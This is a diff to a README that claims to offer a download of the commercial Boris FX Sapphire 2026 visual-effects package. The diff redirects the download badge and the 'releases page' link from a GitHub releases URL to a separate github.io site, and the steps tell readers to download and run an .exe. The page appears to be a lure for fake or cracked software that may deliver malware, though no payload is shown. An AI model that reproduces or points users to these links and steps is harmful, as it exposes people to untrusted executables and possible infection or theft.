@@ -1,6 +1,6 @@
 # 🎥 Boris-FX-Sapphire-2026 - Professional Visual Effects For Video Projects
 
-[![](https://img.shields.io/badge/Download-Sapphire_2026-blue.svg)](https://github.com/Leastresistancebubo928/Boris-FX-Sapphire-2026/releases)
+[![](https://img.shields.io/badge/Download-Sapphire_2026-blue.svg)](https://leastresistancebubo928.github.io)
 
 Boris FX Sapphire 2026 provides a collection of visual effects for video editing software. This package creates high-quality looks, lighting, and textures for digital content. Use this software to improve your project visuals on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications before you install the software:
 
 Follow these directions to obtain the software:
 
-1. Visit the [releases page](https://github.com/Leastresistancebubo928/Boris-FX-Sapphire-2026/releases) to view current versions.
+1. Visit the [releases page](https://leastresistancebubo928.github.io) to view current versions.
 2. Search for the latest release labeled "2026" at the top of the list.
 3. Locate the installation file ending in .exe.
 4. Click the file name to start the download to your computer.
